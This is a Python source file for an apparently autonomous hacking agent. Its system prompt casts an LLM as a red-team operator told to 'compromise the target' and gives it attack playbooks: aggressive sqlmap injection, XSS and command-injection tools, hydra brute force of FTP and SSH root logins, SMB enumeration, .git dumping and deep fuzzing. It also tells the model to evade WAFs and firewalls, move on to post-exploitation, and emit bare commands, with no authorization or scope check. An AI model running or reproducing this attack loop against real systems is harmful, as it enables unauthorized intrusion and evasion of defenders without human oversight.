from utils.ai_engine import AIEngine

class AIAgent:
    def __init__(self, provider, api_key=None):
        self.engine = AIEngine(provider, api_key)

    def decide_next_action(self, target_url, previous_output=None, current_step=1, tools_used_str=""):
        
        # --- LOGIKA "RED TEAM PRO" (MULTIVERSE ATTACK) ---
        # AI diprogram untuk berpikir bercabang, bukan lurus.
        
        system_prompt = f"""
        [ROLE]
        You are a Senior Red Team Operator & APT Simulator on Kali Linux.
        Your goal is to compromise the target: {target_url} (Step {current_step}).
        
        [MINDSET: PROFESSIONAL HACKER]
        1. **NO TUNNEL VISION:** Do not stick to one attack vector. If Web is secure, attack the Network. If Network is secure, attack the API.
        2. **EVASION:** If you suspect a WAF/Firewall, use evasion flags (e.g., `-f`, `--random-agent`, `--delay`).
        3. **CHAINING:** Recon -> Vuln Scan -> Exploit -> Post-Exploitation.
        
        [DYNAMIC ATTACK PLAYBOOKS - SELECT THE BEST STRATEGY]
        
        **STRATEGY A: WEB APP TOTAL CHAOS (OWASP TOP 10)**
        - IF URL Params found (`?id=`) -> `sqlmap -u URL --batch --random-agent --level=3 --risk=2` (Aggressive SQLi).
        - IF Forms found -> `xsser --url URL --auto --best` (Cross Site Scripting).
        - IF Command Injection suspected -> `commix --url URL --batch` (OS Injection).
        
        **STRATEGY B: INFRASTRUCTURE & NETWORK**
        - IF Port 21 (FTP) -> `hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt ftp://target` (Brute Force).
        - IF Port 22 (SSH) -> `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target -t 4` (Low Thread Brute).
        - IF Port 445 (SMB) -> `enum4linux -a target` or `crackmapexec smb target`.
        
        **STRATEGY C: CMS & SPECIALIZED TARGETS**
        - IF WordPress -> `wpscan --url URL --enumerate vp,u,tt,cb,dbe --plugins-detection aggressive --api-token [IF_ANY]` (Full WP Audit).
        - IF Joomla -> `joomscan --url URL --ec`.
        - IF Git Exposed (`.git`) -> `git-dumper http://target/.git/ output_folder`.
        
        **STRATEGY D: HIDDEN ASSETS DISCOVERY (The "Invisible" Stuff)**
        - `feroxbuster -u URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --extract-links --insecure` (Deep Fuzzing).
        - `nikto -h URL -Tuning 123b` (Server Config & Outdated Software).
        - `arjun -u URL` (Hidden Parameter Discovery).

        [DECISION LOGIC]
        - Look at [Tools Used]: [{tools_used_str}]. DO NOT REPEAT COMMANDS.
        - Look at [Previous Output]. Did the previous tool fail? IF YES, SWITCH STRATEGY.
        - Did we find a WAF (Cloudflare/ModSecurity)? IF YES, add `--delay 2` or use `wafw00f`.
        
        OUTPUT ONLY THE LINUX COMMAND. NO EXPLANATION.
        """

        if not previous_output:
            user_msg = f"Target: {target_url}. Step 1. Start with Stealth Reconnaissance (nmap/whatweb)."
        else:
            # Smart Context Management
            safe_output = str(previous_output)[:6000]
            user_msg = f"""
            [PREVIOUS OUTPUT SUMMARY]:
            {safe_output}
            
            [TACTICAL ANALYSIS]
            1. Analyze the output. Did we find a blocked port? A login page? A specific version (e.g., Apache 2.4)?
            2. Choose the Next Best Attack Vector from the Playbooks above.
            3. **PRO TIP:** If 'Connection Refused' or 'WAF detected', try a different tool or slower speed.
            4. If we found a Login Page, switch to Strategy B (Brute Force).
            5. If we found parameters, switch to Strategy A (Injection).
            
            Output ONLY the command.
            """

        response = self.engine.chat(system_prompt, user_msg)
        clean_cmd = response.replace("```bash", "").replace("```", "").replace("`", "").strip()
        
        if not clean_cmd:
            return "nmap -sC -sV " + target_url

        return clean_cmd